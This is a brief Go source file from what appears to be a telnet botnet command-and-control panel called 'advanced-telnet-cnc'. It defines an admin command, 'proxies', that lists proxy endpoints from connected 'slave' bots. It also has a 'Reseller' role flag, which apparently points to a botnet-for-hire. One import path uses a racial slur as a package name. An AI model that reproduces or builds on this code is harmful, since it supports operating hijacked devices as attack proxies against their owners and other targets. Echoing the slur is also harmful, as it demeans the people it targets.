package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	slave_v2 "advanced-telnet-cnc/source/niggers/v2"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"proxies"},
		Description: "",
		Admin:       true,
		Reseller:    false,
		Usage:       nil,
		SubCommands: nil,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			for _, s := range slave_v2.List.Proxy {
				session.Println(s)
			}
			return nil
		},
	})
}
